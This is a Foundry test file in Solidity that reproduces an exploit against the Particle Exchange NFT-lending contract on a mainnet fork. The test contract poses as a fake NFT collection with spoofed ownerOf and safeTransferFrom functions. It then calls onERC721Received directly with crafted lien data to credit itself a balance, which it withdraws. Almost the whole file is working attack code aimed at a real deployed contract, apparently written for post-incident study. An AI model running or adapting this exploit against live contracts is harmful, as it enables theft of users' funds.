// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

import "./IParticleExchange.sol";
/* 
struct Lien {
    address lender; // NFT supplier address
    address borrower; // NFT trade executor address
    address collection; // NFT collection address
    uint256 tokenId;
    /// NFT ID  (@dev: at borrower bidding, this field is used to store margin)
    uint256 price; // NFT supplier's desired sold price
    uint256 rate; // APR in bips, _BASIS_POINTS defined in MathUtils.sol
    uint256 loanStartTime; // loan start block.timestamp
    uint256 auctionStartTime; // auction start block.timestamp
}
*/

IParticleExchange constant ParticleExchange = IParticleExchange(
    payable(0x7c5C9AfEcf4013c43217Fb6A626A4687381f080D)
);
address constant Azuki = 0xB6a37b5d14D502c3Ab0Ae6f3a0E058BC9517786e;
address constant Reservoir = 0xC2c862322E9c97D6244a3506655DA95F05246Fd8;
address constant ParticleExchangeLogic = 0xE4764f9cd8ECc9659d3abf35259638B20ac536E4;

contract ParticleTradeTest is Test {
    address ownerofaddr = address(ParticleExchange);

    function setUp() public {
        vm.createSelectFork("mainnet", 19_231_445);
        vm.label(address(ParticleExchange), "ParticleExchange");
        vm.label(address(Azuki), "Azuki");
        vm.label(address(ParticleExchangeLogic), "ParticleExchangeLogic");
        vm.label(address(Reservoir), "Reservoir");
    }

    function print(string memory _txt, uint256 value, uint256 decimal) public {
        emit log_named_decimal_uint(_txt, value, decimal);
    }

    function testExploit() public {
        payable(address(0)).transfer(address(this).balance);
        print("Eth balance before", address(this).balance, 18);

        uint256 tokenId = 50_126_827_091_960_426_151;
        uint256 tokenId2 = 19_231_446;
        uint256 lienId = ParticleExchange.offerBid(
            address(this),
            uint256(0),
            uint256(0),
            uint256(0)
        );
        IParticleExchange.Lien memory lien = IParticleExchange.Lien({
            lender: address(0),
            borrower: address(this),
            collection: address(this),
            tokenId: 0,
            price: 0,
            rate: 0,
            loanStartTime: 0,
            auctionStartTime: 0
        });
        uint256 amount = 0;
        bytes memory bytecode = (
            abi.encode(lien, lienId, amount, Reservoir, address(0), "0x")
        );
        ParticleExchange.onERC721Received(
            address(0),
            address(0),
            tokenId,
            bytecode
        );

        IParticleExchange.Lien memory lien2 = IParticleExchange.Lien({
            lender: address(0),
            borrower: address(this),
            collection: address(this),
            tokenId: tokenId,
            price: 0,
            rate: 0,
            loanStartTime: block.timestamp,
            auctionStartTime: 0
        });

        bytes memory bytecode2 = (
            abi.encode(lien2, lienId, amount, Reservoir, address(0), "0x")
        );
        ownerofaddr = address(ParticleExchange);
        ParticleExchange.onERC721Received(
            address(0),
            address(0),
            tokenId2,
            bytecode2
        );

        ParticleExchange.accountBalance(address(this));
        ParticleExchange.withdrawAccountBalance();

        print("Eth balance after", address(this).balance, 18);
    }

    function ownerOf(uint256 tokenId) external view returns (address owner) {
        tokenId;
        return ownerofaddr;
    }

    function safeTransferFrom(
        address from,
        address to,
        uint256 tokenId,
        bytes calldata _data
    ) external {
        from;
        to;
        tokenId;
        _data;

        ownerofaddr = address(0);
        return;
    }

    receive() external payable {}
}
